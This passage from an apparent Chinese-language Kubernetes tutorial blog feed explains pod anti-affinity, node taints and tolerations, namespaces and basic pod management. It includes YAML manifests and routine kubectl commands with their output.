class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-podantiaffinity-required</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">  <span class="attr">affinity:</span>  <span class="comment">#亲和性设置</span></span><br><span class="line">    <span class="attr">podAntiAffinity:</span> <span class="comment">#设置pod亲和性</span></span><br><span class="line">      <span class="attr">requiredDuringSchedulingIgnoredDuringExecution:</span> <span class="comment"># 硬限制</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">labelSelector:</span></span><br><span class="line">          <span class="attr">matchExpressions:</span> <span class="comment"># 匹配podenv的值在[&quot;pro&quot;]中的标签</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">podenv</span></span><br><span class="line">            <span class="attr">operator:</span> <span class="string">In</span></span><br><span class="line">            <span class="attr">values:</span> [<span class="string">&quot;pro&quot;</span>]</span><br><span class="line">        <span class="attr">topologyKey:</span> <span class="string">kubernetes.io/hostname</span></span><br></pre></td></tr></table></figure><p>上面配置表达的意思是：新Pod必须要与拥有标签nodeenv&#x3D;pro的pod不在同一Node上，运行测试一下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-podantiaffinity-required.yaml</span><br><span class="line">pod/pod-podantiaffinity-required created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发现调度到了node2上</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods pod-podantiaffinity-required -n dev -o wide</span><br><span class="line">NAME                           READY   STATUS    RESTARTS   AGE   IP            NODE   .. </span><br><span class="line">pod-podantiaffinity-required   1/1     Running   0          30s   10.244.1.96   node2  ..</span><br></pre></td></tr></table></figure><h3 id="5-4-3-污点和容忍"><a href="#5-4-3-污点和容忍" class="headerlink" title="5.4.3 污点和容忍"></a>5.4.3 污点和容忍</h3><p><strong>污点（Taints）</strong></p><p>前面的调度方式都是站在Pod的角度上，通过在Pod上添加属性，来确定Pod是否要调度到指定的Node上，其实我们也可以站在Node的角度上，通过在Node上添加<strong>污点</strong>属性，来决定是否允许Pod调度过来。</p><p>Node被设置上污点之后就和Pod之间存在了一种相斥的关系，进而拒绝Pod调度进来，甚至可以将已经存在的Pod驱逐出去。</p><p>污点的格式为：<code>key=value:effect</code>, key和value是污点的标签，effect描述污点的作用，支持如下三个选项：</p><ul><li>PreferNoSchedule：kubernetes将尽量避免把Pod调度到具有该污点的Node上，除非没有其他节点可调度</li><li>NoSchedule：kubernetes将不会把Pod调度到具有该污点的Node上，但不会影响当前Node上已存在的Pod</li><li>NoExecute：kubernetes将不会把Pod调度到具有该污点的Node上，同时也会将Node上已存在的Pod驱离</li></ul><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200605021831545.png" alt="image-20200605021606508"></p><p>使用kubectl设置和去除污点的命令示例如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置污点</span></span><br><span class="line">kubectl taint nodes node1 key=value:effect</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">去除污点</span></span><br><span class="line">kubectl taint nodes node1 key:effect-</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">去除所有污点</span></span><br><span class="line">kubectl taint nodes node1 key-</span><br></pre></td></tr></table></figure><p>接下来，演示下污点的效果：</p><ol><li>准备节点node1（为了演示效果更加明显，暂时停止node2节点）</li><li>为node1节点设置一个污点: <code>tag=heima:PreferNoSchedule</code>；然后创建pod1( pod1 可以 )</li><li>修改为node1节点设置一个污点: <code>tag=heima:NoSchedule</code>；然后创建pod2( pod1 正常 pod2 失败 )</li><li>修改为node1节点设置一个污点: <code>tag=heima:NoExecute</code>；然后创建pod3 ( 3个pod都失败 )</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">为node1设置污点(PreferNoSchedule)</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:PreferNoSchedule</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建pod1</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl run taint1 --image=nginx:1.17.1 -n dev</span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev -o wide</span><br><span class="line">NAME                      READY   STATUS    RESTARTS   AGE     IP           NODE   </span><br><span class="line">taint1-7665f7fd85-574h4   1/1     Running   0          2m24s   10.244.1.59   node1    </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">为node1设置污点(取消PreferNoSchedule，设置NoSchedule)</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl taint nodes node1 tag:PreferNoSchedule-</span><br><span class="line">[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:NoSchedule</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建pod2</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl run taint2 --image=nginx:1.17.1 -n dev</span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods taint2 -n dev -o wide</span><br><span class="line">NAME                      READY   STATUS    RESTARTS   AGE     IP            NODE</span><br><span class="line">taint1-7665f7fd85-574h4   1/1     Running   0          2m24s   10.244.1.59   node1 </span><br><span class="line">taint2-544694789-6zmlf    0/1     Pending   0          21s     &lt;none&gt;        &lt;none&gt;   </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">为node1设置污点(取消NoSchedule，设置NoExecute)</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl taint nodes node1 tag:NoSchedule-</span><br><span class="line">[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:NoExecute</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建pod3</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl run taint3 --image=nginx:1.17.1 -n dev</span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev -o wide</span><br><span class="line">NAME                      READY   STATUS    RESTARTS   AGE   IP       NODE     NOMINATED </span><br><span class="line">taint1-7665f7fd85-htkmp   0/1     Pending   0          35s   &lt;none&gt;   &lt;none&gt;   &lt;none&gt;    </span><br><span class="line">taint2-544694789-bn7wb    0/1     Pending   0          35s   &lt;none&gt;   &lt;none&gt;   &lt;none&gt;     </span><br><span class="line">taint3-6d78dbd749-tktkq   0/1     Pending   0          6s    &lt;none&gt;   &lt;none&gt;   &lt;none&gt;     </span><br></pre></td></tr></table></figure><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">小提示：</span><br><span class="line">    使用kubeadm搭建的集群，默认就会给<span class="literal">master</span>节点添加一个污点标记,所以pod就不会调度到<span class="literal">master</span>节点上.</span><br></pre></td></tr></table></figure><p><strong>容忍（Toleration）</strong></p><p>上面介绍了污点的作用，我们可以在node上添加污点用于拒绝pod调度上来，但是如果就是想将一个pod调度到一个有污点的node上去，这时候应该怎么做呢？这就要使用到<strong>容忍</strong>。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200514095913741.png" alt="image-20200514095913741"></p><blockquote><p>污点就是拒绝，容忍就是忽略，Node通过污点拒绝pod调度上去，Pod通过容忍忽略拒绝</p></blockquote><p>下面先通过一个案例看下效果：</p><ol><li>上一小节，已经在node1节点上打上了<code>NoExecute</code>的污点，此时pod是调度不上去的</li><li>本小节，可以通过给pod添加容忍，然后将其调度上去</li></ol><p>创建pod-toleration.yaml,内容如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-toleration</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">  <span class="attr">tolerations:</span>      <span class="comment"># 添加容忍</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">&quot;tag&quot;</span>        <span class="comment"># 要容忍的污点的key</span></span><br><span class="line">    <span class="attr">operator:</span> <span class="string">&quot;Equal&quot;</span> <span class="comment"># 操作符</span></span><br><span class="line">    <span class="attr">value:</span> <span class="string">&quot;heima&quot;</span>    <span class="comment"># 容忍的污点的value</span></span><br><span class="line">    <span class="attr">effect:</span> <span class="string">&quot;NoExecute&quot;</span>   <span class="comment"># 添加容忍的规则，这里必须和标记的污点规则相同</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加容忍之前的pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev -o wide</span><br><span class="line">NAME             READY   STATUS    RESTARTS   AGE   IP       NODE     NOMINATED </span><br><span class="line">pod-toleration   0/1     Pending   0          3s    &lt;none&gt;   &lt;none&gt;   &lt;none&gt;           </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加容忍之后的pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev -o wide</span><br><span class="line">NAME             READY   STATUS    RESTARTS   AGE   IP            NODE    NOMINATED</span><br><span class="line">pod-toleration   1/1     Running   0          3s    10.244.1.62   node1   &lt;none&gt;        </span><br></pre></td></tr></table></figure><p>下面看一下容忍的详细配置:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@k8s-master01 ~]# kubectl explain pod.spec.tolerations</span><br><span class="line">......</span><br><span class="line">FIELDS:</span><br><span class="line">   key       # 对应着要容忍的污点的键，空意味着匹配所有的键</span><br><span class="line">   value     # 对应着要容忍的污点的值</span><br><span class="line">   operator  # key-value的运算符，支持Equal和Exists（默认）</span><br><span class="line">   effect    # 对应污点的effect，空意味着匹配所有影响</span><br><span class="line">   tolerationSeconds   # 容忍时间, 当effect为NoExecute时生效，表示pod在Node上的停留时间</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Doc </category>
          
          <category> Kubernetes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kubernetes </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes笔记 4</title>
      <link href="/2022/07/11/ef971b367edb-q1jun/"/>
      <url>/2022/07/11/ef971b367edb-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="4-实战入门"><a href="#4-实战入门" class="headerlink" title="4. 实战入门"></a>4. 实战入门</h1><p>本章节将介绍如何在kubernetes集群中部署一个nginx服务，并且能够对其进行访问。</p><h2 id="4-1-Namespace"><a href="#4-1-Namespace" class="headerlink" title="4.1 Namespace"></a>4.1 Namespace</h2><p>Namespace是kubernetes系统中的一种非常重要资源，它的主要作用是用来实现<strong>多套环境的资源隔离</strong>或者<strong>多租户的资源隔离</strong>。</p><p>默认情况下，kubernetes集群中的所有的Pod都是可以相互访问的。但是在实际中，可能不想让两个Pod之间进行互相的访问，那此时就可以将两个Pod划分到不同的namespace下。kubernetes通过将集群内部的资源分配到不同的Namespace中，可以形成逻辑上的”组”，以方便不同的组的资源进行隔离使用和管理。</p><p>可以通过kubernetes的授权机制，将不同的namespace交给不同租户进行管理，这样就实现了多租户的资源隔离。此时还能结合kubernetes的资源配额机制，限定不同租户能占用的资源，例如CPU使用量、内存使用量等等，来实现租户可用资源的管理。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200407100850484.png" alt="image-20200407100850484"></p><p>kubernetes在集群启动之后，会默认创建几个namespace</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@master ~]# kubectl  get namespace</span><br><span class="line">NAME              STATUS   AGE</span><br><span class="line">default           Active   45h     #  所有未指定Namespace的对象都会被分配在default命名空间</span><br><span class="line">kube-node-lease   Active   45h     #  集群节点之间的心跳维护，v1.13开始引入</span><br><span class="line">kube-public       Active   45h     #  此命名空间下的资源可以被所有人访问（包括未认证用户）</span><br><span class="line">kube-system       Active   45h     #  所有由Kubernetes系统创建的资源都处于这个命名空间</span><br></pre></td></tr></table></figure><p>下面来看namespace资源的具体操作：</p><p><strong>查看</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1 查看所有的ns  命令：kubectl get ns</span></span><br><span class="line">[root@master ~]# kubectl get ns</span><br><span class="line">NAME              STATUS   AGE</span><br><span class="line">default           Active   45h</span><br><span class="line">kube-node-lease   Active   45h</span><br><span class="line">kube-public       Active   45h     </span><br><span class="line">kube-system       Active   45h     </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2 查看指定的ns   命令：kubectl get ns ns名称</span></span><br><span class="line">[root@master ~]# kubectl get ns default</span><br><span class="line">NAME      STATUS   AGE</span><br><span class="line">default   Active   45h</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3 指定输出格式  命令：kubectl get ns ns名称  -o 格式参数</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubernetes支持的格式有很多，比较常见的是wide、json、yaml</span></span><br><span class="line">[root@master ~]# kubectl get ns default -o yaml</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Namespace</span><br><span class="line">metadata:</span><br><span class="line">  creationTimestamp: &quot;2021-05-08T04:44:16Z&quot;</span><br><span class="line">  name: default</span><br><span class="line">  resourceVersion: &quot;151&quot;</span><br><span class="line">  selfLink: /api/v1/namespaces/default</span><br><span class="line">  uid: 7405f73a-e486-43d4-9db6-145f1409f090</span><br><span class="line">spec:</span><br><span class="line">  finalizers:</span><br><span class="line">  - kubernetes</span><br><span class="line">status:</span><br><span class="line">  phase: Active</span><br><span class="line"><span class="meta prompt_">  </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">4 查看ns详情  命令：kubectl describe ns ns名称</span></span><br><span class="line">[root@master ~]# kubectl describe ns default</span><br><span class="line">Name:         default</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line">Status:       Active  # Active 命名空间正在使用中  Terminating 正在删除命名空间</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ResourceQuota 针对namespace做的资源限制</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">LimitRange针对namespace中的每个组件做的资源限制</span></span><br><span class="line">No resource quota.</span><br><span class="line">No LimitRange resource.</span><br></pre></td></tr></table></figure><p><strong>创建</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建namespace</span></span><br><span class="line">[root@master ~]# kubectl create ns dev</span><br><span class="line">namespace/dev created</span><br></pre></td></tr></table></figure><p><strong>删除</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除namespace</span></span><br><span class="line">[root@master ~]# kubectl delete ns dev</span><br><span class="line">namespace &quot;dev&quot; deleted</span><br></pre></td></tr></table></figure><p><strong>配置方式</strong></p><p>首先准备一个yaml文件：ns-dev.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Namespace</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">dev</span></span><br></pre></td></tr></table></figure><p>然后就可以执行对应的创建和删除命令了：</p><p>创建：kubectl create -f ns-dev.yaml</p><p>删除：kubectl delete -f ns-dev.yaml</p><h2 id="4-2-Pod"><a href="#4-2-Pod" class="headerlink" title="4.2 Pod"></a>4.2 Pod</h2><p>Pod是kubernetes集群进行管理的最小单元，程序要运行必须部署在容器中，而容器必须存在于Pod中。</p><p>Pod可以认为是容器的封装，一个Pod中可以存在一个或者多个容器。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200407121501907.png" alt="image-20200407121501907"></p><p>kubernetes在集群启动之后，集群中的各个组件也都是以Pod方式运行的。可以通过下面命令查看：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@master ~]# kubectl get pod -n kube-system</span><br><span class="line">NAMESPACE     NAME                             READY   STATUS    RESTARTS   AGE</span><br><span class="line">kube-system   coredns-6955765f44-68g6v         1/1     Running   0          2d1h</span><br><span class="line">kube-system   coredns-6955765f44-cs5r8         1/1     Running   0          2d1h</span><br><span class="line">kube-system   etcd-master                      1/1     Running   0          2d1h</span><br><span class="line">kube-system   kube-apiserver-master            1/1     Running   0          2d1h</span><br><span class="line">kube-system   kube-controller-manager-master   1/1     Running   0          2d1h</span><br><span class="line">kube-system   kube-flannel-ds-amd64-47r25      1/1     Running   0          2d1h</span><br><span class="line">kube-system   kube-flannel-ds-amd64-ls5lh      1/1     Running   0          2d1h</span><br><span class="line">kube-system   kube-proxy-685tk                 1/1     Running   0          2d1h</span><br><span class="line">kube-system   kube-proxy-87spt                 1/1     Running   0          2d1h</span><br><span class="line">kube-system   kube-scheduler-master            1/1     Running   0          2d1h</span><br></pre></td></tr></table></figure><p><strong>创建并运行</strong></p><p>kubernetes没有提供单独运行Pod的命令，都是通过Pod控制器来实现的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令格式： kubectl run (pod控制器名称) [参数]</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--image  指定Pod的镜像</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--port   指定端口</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--namespace  指定namespace</span></span><br><span class="line">[root@master ~]# kubectl run nginx --image=nginx:latest --port=80 --namespace dev </span><br><span class="line">deployment.apps/nginx created</span><br></pre></td></tr></table></figure><p><strong>查看pod信息</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看Pod基本信息</span></span><br><span class="line">[root@master ~]# kubectl get pods -n dev</span><br><span class="line">NAME    READY   STATUS    RESTARTS   AGE</span><br><span class="line">nginx   1/1     Running   0          43s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看Pod的详细信息</span></span><br><span class="line">[root@master ~]# kubectl describe pod nginx -n dev</span><br><span class="line">Name:         nginx</span><br><span class="line">Namespace:    dev</span><br><span class="line">Priority:     0</span><br><span class="line">Node:         node1/192.168.5.4</span><br><span class="line">Start Time:   Wed, 08 May 2021 09:29:24 +0800</span><br><span class="line">Labels:       pod-template-hash=5ff7956ff6</span><br><span class="line">              run=nginx</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line">Status:       Running</span><br><span class="line">IP:           10.244.1.23</span><br><span class="line">IPs:</span><br><span class="line">  IP:           10.244.1.23</span><br><span class="line">Controlled By:  ReplicaSet/nginx</span><br><span class="line">Containers:</span><br><span class="line">  nginx:</span><br><span class="line">    Container ID:   docker://4c62b8c0648d2512380f4ffa5da2c99d16e05634979973449c98e9b829f6253c</span><br><span class="line">    Image:          nginx:latest</span><br><span class="line">    Image ID:       docker-pullable://nginx@sha256:485b610fefec7ff6c463ced9623314a04ed67e3945b9c08d7e53a47f6d108dc7</span><br><span class="line">    Port:           80/TCP</span><br><span class="line">    Host Port:      0/TCP</span><br><span class="line">    State:          Running</span><br><span class="line">      Started:      Wed, 08 May 2021 09:30:01 +0800</span><br><span class="line">    Ready:          True</span><br><span class="line">    Restart Count:  0</span><br><span class="line">    Environment:    &lt;none&gt;</span><br><span class="line">    Mounts:</span><br><span class="line">      /var/run/secrets/kubernetes.io/serviceaccount from default-token-hwvvw (ro)</span><br><span class="line">Conditions:</span><br><span class="line">  Type              Status</span><br><span class="line">  Initialized       True</span><br><span class="line">  Ready             True</span><br><span class="line">  ContainersReady   True</span><br><span class="line">  PodScheduled      True</span><br><span class="line">Volumes:</span><br><span class="line">  default-token-hwvvw:</span><br><span class="line">    Type:        Secret (a volume populated by a Secret)</span><br><span class="line">    SecretName:  default-token-hwvvw</span><br><span class="line">    Optional:    false</span><br><span class="line">QoS Class:       BestEffort</span><br><span class="line">Node-Selectors:  &lt;none&gt;</span><br><span class="line">Tolerations:     node.kubernetes.io/not-ready:NoExecute for 300s</span><br><span class="line">                 node.kubernetes.io/unreachable:NoExecute for 300s</span><br><span class="line">Events:</span><br><span class="line">  Type    Reason     Age        From               Message</span><br><span class="line">  ----    ------     ----       ----               -------</span><br><span class="line">  Normal  Scheduled  &lt;unknown&gt;  default-scheduler  Successfully assigned dev/nginx-5ff7956ff6-fg2db to node1</span><br><span class="line">  Normal  Pulling    4m11s      kubelet, node1     Pulling image &quot;nginx:latest&quot;</span><br><span class="line">  Normal  Pulled     3m36s      kubelet, node1     Successfully pulled image &quot;nginx:latest&quot;</span><br><span class="line">  Normal  Created    3m36s      kubelet, node1     Created container nginx</span><br><span class="line">  Normal  Started    3m36s      kubelet, node1     Started container nginx</span><br></pre></td></tr></table></figure><p><strong>访问Pod</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取podIP</span></span><br><span class="line">[root@master ~]# kubectl get pods -n dev -o wide</span><br><span class="line">NAME    READY   STATUS    RESTARTS   AGE    IP             NODE    ... </span><br><span class="line">nginx   1/1     Running   0          190s   10.244.1.23   node1   ...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">访问POD</span></span><br><span class="line">[root@master ~]# curl http://10.244.1.23:80</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Welcome to nginx!&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>删除指定Pod</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除指定Pod</span></span><br><span class="line">[root@master ~]# kubectl delete pod nginx -n dev</span><br><span class="line">pod 